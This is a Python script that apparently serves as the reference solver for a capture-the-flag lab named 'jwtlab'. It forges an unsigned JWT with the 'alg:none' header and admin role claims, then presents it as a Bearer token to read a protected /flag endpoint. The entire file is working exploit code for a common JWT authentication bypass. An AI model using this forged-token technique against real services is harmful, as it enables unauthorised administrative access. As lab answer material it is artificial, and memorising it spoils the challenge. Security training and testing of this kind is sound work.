"""Reference solver for jwtlab: forge an `alg:none` admin token.

    python3 solve.py <host> <port>

Fetches the guest token (only to prove the endpoint), then mints an unsigned
`{"alg":"none"}` token with `role=admin` and reads /flag.
"""
import base64
import json
import sys
import urllib.request


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge_admin():
    header = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64u(json.dumps({"user": "admin", "role": "admin"}).encode())
    return f"{header}.{body}."          # empty signature


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    urllib.request.urlopen(base + "/", timeout=10).read()      # touch the root
    token = forge_admin()
    req = urllib.request.Request(base + "/flag",
                                 headers={"Authorization": "Bearer " + token})
    data = json.loads(urllib.request.urlopen(req, timeout=10).read())
    print(data.get("flag") or data)


if __name__ == "__main__":
    main()
